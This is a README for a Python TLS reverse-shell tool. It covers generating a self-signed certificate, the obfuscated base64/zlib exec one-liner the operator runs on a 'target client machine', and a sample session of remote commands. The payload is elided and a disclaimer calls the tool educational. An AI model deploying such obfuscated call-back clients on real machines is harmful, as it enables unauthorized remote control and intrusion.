
# TLS Reverse Shell

This repository contains a Python-based TLS server and a generated client script designed for secure remote communication. The server uses a self-signed SSL certificate to ensure encrypted communication. The client script is dynamically generated and compressed for easy deployment.

---

## **Features**
- Generates RSA keys and a self-signed SSL certificate.
- Dynamically creates a one-liner client script.
- Encrypted communication using TLS.
- Ability to control the client remotely.
- Graceful server shutdown with confirmation prompt.

---

## **Requirements**
### **Dependencies**
- Python 3.6+
- Libraries:
  - `pycryptodome`
  - `zlib` (standard library)
  - `ssl` (standard library)
  - `socket` (standard library)
  
Install dependencies with:
```bash
pip install pycryptodome
```

### **Other Tools**
- OpenSSL (pre-installed on most systems)

---

## **How to Use**

### **1. Setup**
1. Clone the repository:
   ```bash
   git clone https://github.com/yourusername/tls-reverse-shell.git
   cd tls-reverse-shell
   ```

2. Install the required libraries:
   ```bash
   pip install pycryptodome
   ```

---

### **2. Running the Server**
Run the server script:
```bash
python server.py
```

When prompted, enter the server's IP address (e.g., `192.168.1.11`).

The server will:
- Generate or reuse existing RSA keys and a self-signed SSL certificate.
- Provide a one-liner Python client script.

---

### **3. Deploying the Client**
Copy the one-liner client script from the server output. Run it on the target client machine:
```bash
python -c "import zlib,base64;exec(zlib.decompress(base64.b64decode('...')))"
```

The client will connect back to the server.

---

### **4. Using the Shell**
- After the client connects, enter commands into the shell to execute them on the client machine.
- To end the session, type:
  ```plaintext
  exit
  ```

- The server will ask for confirmation to shut down:
  ```plaintext
  [?] Do you want to shut down the server? (y/n)
  ```

  - If you confirm with `y`, the server shuts down, freeing the port.
  - If you respond with `n`, the current session ends, but the server keeps listening for new connections.

---

## **Example Workflow**
1. Start the server:
   ```bash
   python server.py
   ```
   Example output:
   ```plaintext
   [*] Server listening on 192.168.1.11:443
   [--- One-Liner Python Client Code ---]
   python -c "import zlib,base64;exec(zlib.decompress(base64.b64decode('...')))"
   [--- End of Client Code ---]
   ```

2. Deploy and run the client script on another machine:
   ```bash
   python -c "import zlib,base64;exec(zlib.decompress(base64.b64decode('...')))"
   ```

3. Execute commands on the client:
   ```plaintext
   Shell> pwd
   /home/client_user
   Shell> ls
   Desktop  Documents  Downloads
   Shell> exit
   [?] Do you want to shut down the server? (y/n): n
   [*] Session ended, but the server is still running.
   ```

---

## **File Structure**
```
.
├── server.py           # Main server script
├── keys/               # Directory for storing RSA keys and SSL certificates
│   ├── private_key.pem # RSA private key
│   ├── public_key.pem  # RSA public key
│   └── server.crt      # Self-signed SSL certificate
```

---

## **Security Notes**
- This project is **for educational purposes only**. Do not use it for unauthorized access to systems or networks.
- Always obtain permission before deploying the client script on any machine.
- Consider replacing the self-signed certificate with one from a trusted Certificate Authority for real-world use.

---